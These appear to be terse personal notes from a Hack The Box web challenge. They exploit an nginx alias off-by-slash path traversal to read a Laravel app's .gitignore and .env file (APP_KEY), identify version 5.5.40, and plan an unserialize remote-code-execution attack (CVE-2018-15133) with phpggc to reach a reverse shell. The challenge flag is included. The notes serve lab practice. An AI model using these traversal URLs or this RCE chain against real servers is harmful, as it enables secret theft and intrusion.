http://142.93.38.140:30899/assets/


gobuster dir in that directory?

---------------------------

http://142.93.38.140:30899/assets../server.php

Alias LFI miconfigutation

https://book.hacktricks.xyz/pentesting/pentesting-web/nginx


---------------

Use `gixy`:

```
docker run --rm -v `pwd`/nginx.conf:/etc/nginx/conf/nginx.conf yandex/gixy /etc/nginx/conf/nginx.conf
```

-----------

http://142.93.38.140:30899/assets../.gitignore

Can now find the APP_KEY secret key:


http://142.93.38.140:30899/assets../.env

-------------

Can check the Laravel version:

https://stackoverflow.com/questions/44637811/how-to-know-laravel-version-and-where-is-it-defined

http://167.99.194.59:31597/assets../framework/blob/master/src/Illuminate/Foundation/Application.php

http://167.99.194.59:31597/assets../vendor/laravel/framework/src/Illuminate/Foundation/Application.php

```
const VERSION = '5.5.40';
```
 

This should be vulnerable
https://nvd.nist.gov/vuln/detail/CVE-2018-15133





----

Starting the attack

https://blog.truesec.com/2020/02/12/from-s3-bucket-to-laravel-unserialize-rce/


Need phpggc

```
git clone https://github.com/ambionics/phpggc
sudo apt install php7.4-cli
```

Using this we can get a reverse shell :)

flag is in `/`

```
HTB{0ff_by_sl4sh_pwn4g3}
```